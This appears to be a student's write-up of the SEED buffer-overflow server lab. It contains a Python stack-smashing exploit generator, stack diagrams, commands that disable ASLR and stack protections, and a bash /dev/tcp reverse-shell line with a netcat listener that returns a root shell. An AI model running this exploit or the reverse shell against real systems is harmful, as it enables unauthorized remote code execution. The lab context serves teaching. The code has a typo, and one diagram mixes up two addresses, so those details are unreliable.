# Buffer Overflow (Server Version)

## Lab Environment Setup
- SEED Ubuntu 20.04 VM
- Turn off countermeasures
    - `sudo /sbin/sysctl -w kernel.randomize_va_space=0`
    - important, if the randomization is not turned off, the frame pointer and buffer's address will be different each time we execute the program

- Compilation
    - `gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c`
    - `-z execstack` Turn off the non-executable stack protection
    - `-fno-stack-protector stack.c` Turn off the StackGuard

## Task 1: Get Familiar with the Shellcode
- The goal of buffer-overflow attacks is to inject malicious code into the program.
- Shellcode is widely used in most code-injection attacks.
- **Shellcode**: a piece of code that launches a shell, and is usually written in assembly language.
- The shellcode is provided, modify it to run arbitrary command, but ensure not to change the length of the argument string. For more information about shellcode, refer to the **Shellcode Development Lab**

## Task 2: Level-1 Attack
- Target Server: `10.9.0.5:9090` (32-bit)
- Send a benign message to the server:
    ```
    $ echo hello | nc 10.9.0.5 9090
    (Press ctrl+C)
    ```
    ```
    $ docker-compose up
    ...
    server-1-10.9.0.5 | Got a connection from 10.9.0.1
    server-1-10.9.0.5 | Starting stack
    server-1-10.9.0.5 | Input size: 6
    server-1-10.9.0.5 | Frame Pointer (ebp) inside bof(): 0xffffd318
    server-1-10.9.0.5 | Buffer's address inside bof():    0xffffd2a8
    server-1-10.9.0.5 | ==== Returned Properly ====
    ```

- Increase the input length, until `bof()` can't return properly
    - in my case, `bof()` could return properly until input size was less than 98
    ```
    server-1-10.9.0.5 | Got a connection from 10.9.0.1
    server-1-10.9.0.5 | Starting stack
    server-1-10.9.0.5 | Input size: 98
    server-1-10.9.0.5 | Frame Pointer (ebp) inside bof(): 0xffffd318
    server-1-10.9.0.5 | Buffer's address inside bof():    0xffffd2a8
    ```

- Exploit
    - use `exploit.py` to generate `badfile`, which contains the payload
    - [NOP, no-op, NOOP](https://en.wikipedia.org/wiki/NOP_(code))
    - `exploit.py`
        ```
        #!/usr/bin/python3
        import sys

        shellcode = (
            "" # Need to change

        ).encode('latin-1')

        # Fill the content with NOP's
        content = bytearray(0x90 for i in range(517))

        #############################################
        ebp      = 0xffffd318
        buf_addr = 0xffffd2a8
        delta    = ebp - buf_addr

        # Put the shellcode in the final part of the payload
        start = 517 - len(shellcode)
        content[start: start + len(shellcode)] = shellccode

        # Return to somewhere before the shellcode
        # save it somewhere in the payload
        ret = ebp + 10     # ebp + x, just ensure that the return address is after (ebp + 8), but before the shellcode
        offset = delta + 4 # Put ret (the new return address) next to ebp

        # User 4 for 32-bit address, and 8 for 64-bit address
        content[offset:offset+4] = (ret).to_bytes(4, byteorder='little')

        #############################################
        with open('badfile', 'wb') as f:
            f.write(content)
        ```

    - Original Stack
        ```
        High Memory Addresses
        |          +---------------------+
        |          |        ...          |
        |          +---------------------+  <-- 0xffffd318 + 8
        |          |    Return Address   |
        |          +---------------------+  <-- 0xffffd318 + 4
        |          |   Previous %ebp     |
        |          +---------------------+  <-- 0xffffd318 (ebp)
        |          |        ...          |
        |          |---------------------|
        |          |                     |
        |          |                     |
        |          |       Buffer        |
        |          |                     |
        |          |                     |
        |          |---------------------|  <-- 0xffffd2a8 (&buffer)
        |          |        ...          |
        |          +---------------------+
        |          |    Unused Space     |
        |          +---------------------+
        |
        Low Memory Addresses
        ```
    - Stack After Buffer-Overflow
        ```
        High Memory Addresses
        |          +---------------------+ 
        |          |                     |
        |          |     Shellcode       |
        |          |                     |
        |          +---------------------+
        |          |        NOPs         |
        |          |---------------------|  <-- 0xffffd318 + 10
        |          |        NOPs         |
        |          +---------------------+  <-- 0xffffd318 + 8
        |          |   0xffffd318 + 10   |
        |          | (New Return Address)|
        |          +---------------------+  <-- 0xffffd318 + 4
        |          |        NOPs         |
        |          |---------------------|  <-- 0xffffd318 (ebp)
        |          |        NOPs         |
        |          |---------------------|  <-- 0xffffd2a8 (&buffer)
        |          |        ...          |
        |          +---------------------+
        |          |    Unused Space     |
        |          +---------------------+
        |
        Low Memory Addresses
        ```

- generating a reverse shell
    - replace the command to: `/bin/bash -i >& /dev/tcp/10.9.0.1/9875 0>&1`
    - on the attacker's machine:
        ```
        $ nc -l 9875
        root@0a4c2c385474:/bof# ls
        ls
        core
        server
        stack
        ```

## Task 3: Level-2 Attack
- Target Server: `10.9.0.6:9090` (32-bit)
- the value of `ebp` will not be revealed
- the buffer size is unknown (but we assume that the range of buffer size is `[100, 300]` in bytes)
- due to the memory alignment, in 32-bit systems, the value stored in the frame pointer is always multiple of 4
- by given any input, we can learn that `&buffer` is `0xffffd018`

- solution:
    1. `ret`: make it close to the shellcode, e.g., `ret = buff_addr + 320`
    2. fill the first part of the buffer with the return address `ret`

    - Stack After Buffer-Overflow
        ```
        High Memory Addresses
        |          +---------------------+ 
        |          |                     |
        |          |     Shellcode       |
        |          |                     |
        |          +---------------------+
        |          |        NOPs         |
        |          |---------------------|  <-- 0xffffd318 + 320
        |          |        NOPs         |
        |          +---------------------+  <-- 0xffffd318 + 316
        |          |   0xffffd018 + 320  |
        |          +---------------------+  <-- 0xffffd018 + 312
        |          |   0xffffd018 + 320  |
        |          |---------------------|  <-- unknown (ebp)
        |          |   0xffffd018 + 320  |
        |          |---------------------|  <-- 0xffffd018 (&buffer)
        |          |        ...          |
        |          +---------------------+
        |          |    Unused Space     |
        |          +---------------------+
        |
        Low Memory Addresses
        ```
